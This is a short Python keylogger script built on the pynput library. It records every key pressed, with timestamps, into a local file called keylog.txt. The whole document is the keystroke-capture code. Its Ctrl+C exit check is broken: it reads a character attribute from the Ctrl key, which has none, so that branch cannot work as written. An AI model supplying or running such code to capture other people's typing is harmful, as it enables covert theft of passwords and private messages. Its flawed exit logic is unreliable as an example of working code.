from pynput.keyboard import Key, Listener
import logging
import sys

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    logging.info(str(key))

    # Check for Ctrl+C combination
    if key == Key.ctrl_l and key.char == 'c':
        print("Ctrl+C pressed. Exiting.")
        sys.exit()

with Listener(on_press=on_press) as listener:
    listener.join()
